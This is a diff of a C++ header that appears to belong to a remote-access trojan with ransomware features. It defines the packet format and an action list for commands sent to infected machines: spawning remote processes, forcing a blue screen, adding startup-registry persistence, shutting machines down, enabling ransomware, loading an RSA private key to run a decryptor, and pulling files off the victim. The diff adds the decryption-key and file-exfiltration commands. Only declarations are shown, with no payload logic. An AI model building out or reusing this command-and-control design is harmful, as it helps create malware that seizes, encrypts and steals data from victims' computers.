@@ -7,7 +7,7 @@
 #include <string>
 #include <iterator>
 
-constexpr USHORT MAX_BUFFER_LEN = 4000;
+constexpr USHORT MAX_BUFFER_LEN = 8000;
 
 // bitwise flags optionally included in packets....
 const int NO_CONSOLE          = 1 << 0; // default is to make a console when a command is ran on remote host
@@ -18,6 +18,12 @@ const int RESPOND_WITH_STATUS = 1 << 4; // server wants a response
 const int PACKET_IS_A_COMMAND = 1 << 5; // this packet is a command and the action in the packet must be performed
 
 typedef std::vector<unsigned char> BYTESTRING;
+
+// RSA Der format
+struct DER {
+    unsigned char* data = NULL;
+    int len = 0;
+};
 
 // Response codes sent from the client to the server
 // Usually after a remoteaction is completed
@@ -33,14 +39,17 @@ enum Action {
     kNone,
     kOpenRemoteProcess,
     kClientWantsToDisconnect,  
-    kKillClient,        // forcefully disconnect the client from the server
+    kKillClient,         // forcefully disconnect the client from the server
     kPingClient,
     kKeepAlive,
-    kRemoteBSOD,        // cause a blue screen of death
-    kAddToStartup,      // add a program file path to startup registry
-    kRemoteShutdown,    // shut down the client machine
-    kRansomwareEnable,  // dangerous, enable ransomware on client machine
-    kAddClientToServer, // client wants to be added to tcp server
+    kRemoteBSOD,         // cause a blue screen of death
+    kAddToStartup,       // add a program file path to startup registry
+    kRemoteShutdown,     // shut down the client machine
+    kRansomwareEnable,   // dangerous, enable ransomware on client machine
+    kSetAsDecryptionKey, // Tell the client that the data in buffer is der format of the private rsa key
+    kRunDecryptor,       // run the ransomware decryptor if the private key is on the machine
+    kAddClientToServer,  // client wants to be added to tcp server
+    kReceiveFileFromClient, // server wants to get a file from client remote hsot
 };
 
 enum SocketTypes {
@@ -92,12 +101,5 @@ struct Packet {
     }
 };
 #pragma pack(pop, 0)
-
-struct RSAKeys {
-    RSA* pub;
-    RSA* priv;
-};
-
-
 
 typedef Packet ServerCommand, ServerRequest, ServerResponse;
